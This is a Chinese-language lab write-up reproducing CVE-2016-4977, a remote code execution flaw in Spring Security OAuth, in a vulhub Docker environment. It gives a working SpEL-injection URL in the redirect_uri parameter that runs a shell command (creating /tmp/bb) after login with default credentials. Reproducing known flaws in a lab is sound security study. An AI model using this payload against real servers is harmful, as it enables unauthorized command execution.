## Spring Security OAuth Remote Code Execution（CVE-2016-4977）

#### 1.漏洞信息

| 项目     | 描述                                                         |
| -------- | ------------------------------------------------------------ |
| 漏洞名称 | Spring Security OAuth Remote Code Execution                  |
| CVE编号  | CVE-2016-4977                                                |
| 漏洞描述 | Spring Security OAuth是为Spring框架提供安全认证支持的一个模块，在7月5日其维护者发布了这样一个[升级公告](https://pivotal.io/de/security/cve-2016-4977)，主要说明在用户使用`Whitelabel views`来处理错误时，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。漏洞的发现者在10月13日公开了该漏洞的[挖掘记录](http://secalert.net/#CVE-2016-4977)。 |
| 影响范围 | 2.0.0 to 2.0.9 6.0.47                                        |

#### 2.漏洞复现

###### 2.1.环境搭建

参考https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977

启动docker

```
docker-compose up -d 
```

###### 2.2.访问漏洞存在的url

http://localhost:8080/oauth/authorize?response_type=token&client_id=acme&scope=openid&redirect_uri=${T(java.lang.Runtime).getRuntime().exec(%22touch%20/tmp/bb%22)}

会跳出登陆页面，输入admin/admin即可登录成功

![](1.png)

###### 2.3.问题现象

成功触发漏洞，造成命令执行。在/tmp目录下新建了个bb文件。

![](2.png)



